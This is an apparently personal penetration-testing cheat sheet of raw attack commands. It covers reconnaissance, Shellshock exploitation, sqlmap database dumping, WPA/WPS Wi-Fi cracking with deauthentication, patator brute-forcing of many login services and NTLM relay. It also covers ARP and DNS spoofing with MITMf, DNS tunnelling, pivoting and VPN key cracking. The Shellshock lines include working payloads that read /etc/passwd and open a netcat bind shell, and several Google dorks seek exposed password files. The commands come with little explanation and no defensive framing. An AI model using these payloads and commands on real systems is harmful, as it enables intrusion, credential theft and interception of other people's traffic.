OSINT
	Whois
		whois domain-name-here.com 
	DNS IP Lookup
		dig a domain-name-here.com @nameserver 
	MX Record Lookup
		dig mx domain-name-here.com @nameserver
	Zone Transfer with DIG
		dig axfr domain-name-here.com @nameserver
		nslookup -> set type=any -> ls -d blah.com
		Nslookup server; ls -d servername
		nslookup ls -d

		A (address) — Maps a host name to an IP address
		SOA (Start of Authority) — Identifies the DNS server responsible for the domain information
		CNAME (canonical name) — Provides additional names or aliases for the address record
		MX (mail exchange) — Identifies the mail server for the domain
		SRV (service) — Identifies services such as directory services
		PTR (pointer) — Maps IP addresses to host names
		NS (name server) — Identifies other name servers for the domain

	Email
		git clone https://github.com/killswitch-GUI/SimplyEmail.git
		./SimplyEmail.py -all -e TARGET-DOMAIN

	Finger printing
		nc -v 192.168.1.1 25
		telnet 192.168.1.1 25
	
	Banner grabbing
		nc TARGET-IP 80
		GET / HTTP/1.1
		Host: TARGET-IP
		User-Agent: Mozilla/5.0
		Referrer: meh-domain
		<enter>

		Nc -nvv -o output.txt server 80 < nudge.txt
		finger –l @target.example.com finger 0@ip
		openssl s_client –quiet -connect www.example.com:443

Domain permutations
	https://github.com/netevert/dnsmorph
	https://github.com/hardwaterhacker/URLCrazy

Domain Reconn
	dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

	https://pentest-tools.com/home
	https://searchdns.netcraft.com/
	https://www.pkey.in/instrumenti-i/poisk-poddomenov
	https://www.robtex.com/?dns=
	https://bgp.he.net/
	https://dnsdumpster.com/
	http://whois.domaintools.com/
	https://www.virustotal.com/ru/
	https://cleantalk.org/blacklists
	https://bgpview.io/
	https://www.ripe.net/
	https://www.shodan.io/
	https://censys.io/
	https://www.htbridge.com/radar/?id=rpZVtKLJ
	https://sandbox.anlyz.io/#!/malware-dashboard
	https://malwr.com/submission/
	https://www.reverse.it/
	https://www.threatcrowd.org/
	https://mxtoolbox.com/
	https://statonline.ru/domains?search
	https://portal.bgpmon.net/firsttimelogin.php
	https://yougetsignsl.com

	theharvester
	dnsenum

Domain subbrute
	https://github.com/TheRook/subbrute
	https://github.com/rbsec/dnscan
	https://github.com/aboul3la/Sublist3r
	https://github.com/guelfoweb/knock
	https://bitbucket.org/LaNMaSteR53/recon-ng
	https://tools.kali.org/information-gathering/dnsrecon
	
Useful
	https://gchq.github.io/CyberChef/
	https://regex101.com/
	http://www.cmd5.ru/
	https://www.artlebedev.ru/decoder/advanced/

Exploits
	getsploit by Vulners

	searchsploit –u
	searchsploit apache 2.2
	searchsploit "Linux Kernel"
	searchsploit linux 2.6 | grep -i ubuntu | grep local

	Compiling Windows Exploits on Kali
		wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
		wine mingw-get-setup.exe
		select mingw32-base
		cd /root/.wine/drive_c/windows
		wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
		cd /root/.wine/drive_c/MinGW/bin
		wine gcc -o ability.exe /tmp/exploit.c -lwsock32
		wine ability.exe 

	Cross compiling
		gcc -m32 -o output32 hello.c (32 bit)
		gcc -m64 -o output hello.c (64 bit)

	Complile
		gcc -o exploit exploit.c

	Compile Windows.exe
		i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe


ShellShock
	git clone https://github.com/nccgroup/shocker
	./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

	echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
	echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
	nc -l -p 443


SQLmap
	POST request
		sqlmap -r request.txt -p param

	sqlmap -u url/searhc.php/?id=1 --dbms
	sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
	sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php" 
	sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
	sqlmap -o -u "http://meh.com/form/" --forms
	sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump

Wi-Fi
	MacBook
		airport -s

	WPA
		airmon-ng check kill
		airmon-ng start wlan0
		airodump-ng wlan0mon
		airodump-ng -c [channel] --bssid [bssid] -w "File.txt" wlan0mon
		aireplay-ng -0 2 -a [router bssid] -c [client bssid] mon0
			-0 - deauth mode
			2 - number of packets
		aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap

		aireplay-ng --arpreplay -b 00:11:24:A4:44:AF -h 00:1E:C2:B7:95:D9 ath0
		aircrack-ng -z -b 00:11:24:A4:44:AF savefile.cap
		airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
		aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
		aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap

	WPS
		wash -i wlan0mon
		reaver -i wlan0mon -b [bssid] -vv
			or reaver -i wlan0mon -b {BSSID of router} -c {router channel} -vvv -K 1 -f
			or reawer -i mon0 -c 1 -b mac -vv -S --pin=pin
		pixiewps -e -a -S
		airodump-ng –wps –uptime wlan0mon
	
	Settings
		iw reg set BZ
		ifconfig wlan0 hw ether aa:bb:cc:dd:ee
		macchanger -r wlan0
		macchanger -m aa:bb:cc:dd:ee wlan0
		iwconfig wlan0 txpower 30
		
		airmon-ng -wps
		SB = USB method, ETHER = Ethernet, LAB = Label, DISP = Display, EXTNFC = External NFC, INTNFC = Internal NFC, NFCINTF = NFC Interface, PBC = Push
		airodump-ng –wps –uptime wlan0mon

	KRACK
		https://github.com/vanhoefm/krackattacks-scripts
			apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

		Disable hardware encryption
			./krackattack/disable-hwcrypto.sh.

		sudo rfkill unblock wifi
		./krack-test-client.py
		./krack-test-client.py --tptk
		./krack-test-client.py --tptk-rand
		./krack-test-client.py --group

Bruteforce
	patator rdp_login host=NET0 0=192.168.1.0/24

	patator mssql_login host=NET0 0=192.168.1.0/24 user=sa password=FILE1 1=passwords.txt -x ignore:fgrep='Login failed for user'
	patator ssh_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:mesg='Authentication failed.'
	SSH Time-based user enumeration
		patator ssh_login host=NET0 0=192.168.1.0/24 user=admin password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3
	patator smtp_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=/usr/share/john/password.lst 2=/usr/share/john/usernames.lst  -x ignore:fgrep='incorrect password or account name'
	patator ftp_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:mesg='Login incorrect.'
	FTP Enumerating users denied login in vsftpd/userlist
		patator ftp_login host=NET0 0=192.168.1.0/24 user=FILE1 1=logins.txt password=asdf -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
	patator ldap_login host=NET0 0=192.168.1.0/24 binddn='cn=FILE1,dc=example,dc=com' 1=logins.txt bindpw=FILE2 2=passwords.txt -x ignore:mesg='ldap_bind: Invalid credentials (49)' ssl=1 port=636
	patator smb_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:fgrep=STATUS_LOGON_FAILURE
	patator mysql_login host=NET0 0=192.168.1.0/24 user=FILE1 password=FILE2 1=logins.txt 2=passwords.txt -x ignore:fgrep='Access denied for user'
	patator pgsql_login host=NET0 0=192.168.1.0/24 user=postgres password=FILE1 1=passwords.txt -x ignore:fgrep='password authentication failed'
	patator oracle_login host=NET0 0=192.168.1.0/24 sid=FILE1 1=sids.txt -x ignore:code=ORA-12505
	patator vnc_login host=NET0 0=192.168.1.0/24 password=FILE1 1=passwords.txt --threads 1 -x retry:fgrep!='Authentication failure' --max-retries -1 -x quit:code=0
	patator snmp_login host=NET0 0=192.168.1.0/24 community=FILE1 1=names.txt -x ignore:mesg='No SNMP response received before timeout'

	RDP
		/usr/share/Lazy-RDP
	Web
		https://hackware.ru/?p=1453
	Oracle
		nmap --script=oracle-sid-brute 
 		nmap --script=oracle-brute 
 	MS-Sql
 		nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
 		use auxiliary/admin/mssql/mssql_enum

Password cracking
	john --wordlist=/usr/share/wordlists/rockyou.txt hashes
	john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
	john --format=descrypt hash --show

Nmap and UDP port scanner
	nmap -v -sS -A -T4 target
	nmap -v -sS -p--A -T4 target
	nmap -v -sU -sS -p- -A -T4 target
	nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X
	
	git clone https://github.com/portcullislabs/udp-proto-scanner.git
		./udp-protocol-scanner.pl -f ip.txt 
		./udp-proto-scanner.pl -p ntp -f ips.txt

Masscan
	masscan -p22,23,53,445,139,80,443,3389,8080,8443 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL masscan
	masscan --port U:161 192.168.1.0/24 --open-only --wait 0 --rate 50000 -oL udp_masscan
	
	Output:
		-oL -oX -oG

	masscan -p22,23,53,445,139,80,443,3389,8080,8443 192.168.1.0/24 --banners --wait 0 --rate 50000 --source-ip 192.168.1.200

	nmap -v -sS -A -T4 192.168.1.0/24

	masscan -p3306,27017,27018,1433,1434,1521,5432,5433 10.0.0.0/24 --open-only --wait -0 -oL masscan_db

Ncat scan
	Ncat nc -v -z -w2 192.168.1.1 1-140

IVRE
    ivre runscans --file/--net --output XMLFork
    ivre scan2db -r folder
	
	Out
	    ivre scancli --openport --port 123 --short
	    ivre scancli --net 10.0.17.0/24 --nmap-xml
	    ivre scancli --net 10.0.19.0/24 --json > 10.0.20.0.json
		
Dir bruter
	dirb http://url.com /usr/share/wordlists/dirb/common.txt

Mounting SMB Shares
	mount 192.168.1.1:/vol/share /mnt/nfs
	mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
	net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no
	apt-get install smb4k -y

SMB enum
	nbtscan -v -s : 192.168.1.0/24
	nmblookup -A target
	smbclient //MOUNT/share -I target -N
	rpcclient -U "" target
	enum4linux -a target-ip
	
	SMB version
		smbclient -L //192.168.1.100 

	SMB Users
		nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
		python /usr/share/doc/python-impacket-doc/examples/samrdump.py ip

	Open SMB Shares
		nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   

	use auxiliary/scanner/smb/smb_enumshares
	use auxiliary/scanner/smb/smb_enumusers_domain
	nmap -v -p 445 --script=smb-check-vulns  192.168.1.0/24

SMB
	use auxiliary/scanner/smb/pipe_auditor 
	use auxiliary/scanner/smb/pipe_dcerpc_auditor
	use auxiliary/scanner/smb/smb_enumusers
	use auxiliary/scanner/smb/smb_enumshares

Null session
	net use \\TARGET\IPC$ "" /u:""
	net use \\192.168.202.33\IPC$ "" /u:»"  null session (tcp 139/445)
	net view \\ip
	reg query \\10.219.1.207\HKLM\SOFTWARE\MICROSOFT\ Windows\CurrentVersion\Run
	netusers /h \\ip
	smbclient -L //192.168.99.131

	ridenum 192.168.1.236 500 50000

	./nullinux.py -v --enumshares ip
	python nullinux.py -users -quick 192.168.1.0/24
    python nullinux.py -all 192.168.1.0/24
    python nullinux.py -shares -U 'Domain\User' -P 'Password1' 192.168.1.0
    python nullinux.py 192.168.1.0/24

SNMP enum
	apt-get install snmp-mibs-downloader download-mibs
	echo "" > /etc/snmp/snmp.conf
	
	snmpcheck -t 192.168.1.X -c public
	snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName| cut -d* * -f 
	snmpenum -t 192.168.1.X
	onesixtyone -c names -i hosts
	smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1

	/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

Spoofing
	LLMNR / NBT-NS Spoofing
		auxiliary/spoof/llmnr/llmnr_response
		auxiliary/spoof/nbns/nbns_response

		auxiliary/server/capture/smb
		auxiliary/server/capture/http_ntlm
		or
		python Responder.py -i local-ip -I eth0

	WPAD
		python Responder.py -I eth0 -wFb
		python Responder.py -I eth0 -r On -w On

		use auxiliary/server/wpad 
		use auxiliary/spoof/nbns/nbns_response

		NTLM relay
			apt-get install crackmapexec

			[Responder Core]

			; Servers to start
			SQL = On
			SMB = Off     # Turn this off
			Kerberos = On
			FTP = On
			POP = On
			SMTP = On
			IMAP = On
			HTTP = Off    # Turn this off
			HTTPS = On
			DNS = On
			LDAP = On

			cme smb <CIDR> --gen-relay-list targets.txt
			python Responder.py -I <interface> -r -d -w
			ntlmrelayx.py -tf targets.txt

			pip install ldap3==1.4.0
			pip install ldap3
			pip install impacket
			pip install tcpshell
	MiTMf
		The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface eth0:
			python mitmf.py -i eth0
		ARP poison the whole subnet with the gateway at 192.168.1.1 using the Spoof plugin:
			python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254
		Same as above + a WPAD rogue proxy server using the Responder plugin:
			python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --wpad
		ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
			python mitmf.py -i eth0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1
		Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
			python mitmf.py -i eth0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1
		Enable LLMNR/NBTNS/MDNS spoofing:
			python mitmf.py -i eth0 --responder --wredir --nbtns
		Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
			python mitmf.py -i eth0 --spoof --dhcp
		
		load msgrpc Pass=abc123
		python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --wpad --forcewpadauth --wredir --nbtns
		python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --responder --smbauth --responder --basic --wpad
		(MITMf) root@kali:/usr/share/MITMf# python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --filepwn
		(MITMf) root@kali:/usr/share/MITMf# python mitmf.py -i eth0 --spoof --arp --gateway 10.0.17.254 --dns --hsts --ferretng --screen --responder --wpad --forcewpadauth --basic

		sysctl -w  net.ipv4.ip_forward=1
		arpspoof
		dsniff -t 21/tcp=ftp,23/tcp=telnet -n

		sudo apt-get install python3-dev python3-pip libffi-dev libssl-dev
		apt-get install python-pyasn1 python-flask python-urwid python-dev libxml2-dev libxslt-dev libffi-dev
		pip install mitmproxy
		iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
		iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

		apt-get install bettercap

		git clone https://github.com/singe/dns2proxy.git
		git clone https://github.com/DanMcInerney/net-creds.git

Databases
	DB Ports
		MySql
			3306
		Mongo
			27017,27018
		MSSql
			1433,1434
		Oracle
			1521
		Postgres
			5432,5433

	Oracle
		oscanner -s 192.168.1.200 -P 1521 
	Mongo
		apt-get install mongodb-clients
		mongo --port <port> -u <username> -p <password> <IP>
	MySql
		mysql -h dbipaddress -u user -p
	SqlLite
		sqlite3
	MS-SQL
		https://www.darkoperator.com/blog/2009/11/27/attacking-mssql-with-metasploit.html
		use auxiliary/scanner/mssql/mssql_ping
		use auxiliary/scanner/mssql/mssql_login
	sqlrecon.exe

VNC
	sudo apt-get install vncviewer

Crack
	john --wordlist=/usr/share/wordlists/rockyou.txt hashes
	hashcat -m 5600 SMB-NTLMv2-Client-10.7.7.30.txt ~/dic.txt 

Some new SSH algorithms
    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@ip
    ssh-dss user@ip

Zmap & Zgrab
	zmap 172.16.128.0/17 -r 10000 -p 4786 -o - | /root/go/src/github.com/zmap/zgrab/zgrab -timeout=10 -port=4786 -data probe.txt -output-file=banners.json

Zgrab
	apt-get install zmap
	wget https://storage.googleapis.com/golang/go1.9.2.linux-amd64.tar.gz
	tar -C /usr/local -xzf go1.5.3.linux-amd64.tar.gz
	export PATH=$PATH:/usr/local/go/bin
	go version
	export https_proxy=https://arcbot:3128 
	export http_proxy=http://arcbot:3128
	go get github.com/zmap/zgrab
	go build github.com/zmap/zgrab

SSH Tunnel
	plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP

SSH Port Forwarding
	ssh -L 9999:10.0.2.2:445 user@192.168.2.250
		Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250
	ssh -D 127.0.0.1:9050 root@192.168.2.250
		Dynamically allows all port forwards to the subnets availble on the target.
	ssh -L 3389:192.168.2.3:3389 user@192.168.2.2
	rdesktop 127.0.0.1
		RDP Port Forwarding

Proxychains
	proxychains rdesktop TARGET-IP

DNS Tunneling
	Attacking machine
		Install
			apt-get update
			apt-get -y install ruby-dev git make g++
			gem install bundler
			git clone https://github.com/iagox86/dnscat2.git
			cd dnscat2/server
			bundle install
		Run
			ruby ./dnscat2.rb
			dnscat2> New session established: 1422
			dnscat2> session -i 1422
	Target machine
		https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/
		dnscat --host <dnscat server_ip>

SSH Pivoting
	ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
	proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2

Vlan Hopping
	git clone https://github.com/nccgroup/vlan-hopping.git
	chmod 700 frogger.sh
	./frogger.sh 

Scan VPN Servers
	./udp-protocol-scanner.pl -p ike -f ip.txt

Attack VPN Services
	pip install pyip
	git clone https://github.com/SpiderLabs/ikeforce.git
	./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
	./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1

	ike-scan
	ike-scan TARGET-IP
	ike-scan -A TARGET-IP
	ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key

	filetype:pcf
	./ike-scan vpn.elec0ne.com
	nmap -sU -p 500
	ikeprobe.exe vpn.elec0ne.com

IKE Aggressive Mode PSK Cracking
	Identify VPN Servers
		./udp-protocol-scanner.pl -p ike SUBNET/24
	Enumerate with IKEForce to obtain the group ID
		./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
	Use ike-scan to capture the PSK hash from the IKE endpoint
		ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
	Use psk-crack to crack the hash
		psk-crack hash-file.txt

Web
	Index of /admin"	
	“Index of /password"
	“Index of /mail"
	“Index of /" +banques +filetype:xls (for France)
	“Index of /" +passwd
	“Index of /" password.txt
	Index of /admin"
	“Index of /password"
	“Index of /mail"
	“Index of /" +banques +filetype:xls (for France)
	“Index of /" +passwd
	“Index of /" password.txt
		inurl:exchange inurl:finduser inurl:root
	type=hidden name=price
https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
https://github.com/lgandx/Responder
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
https://github.com/byt3bl33d3r/MITMf
https://hackware.ru/?p=917
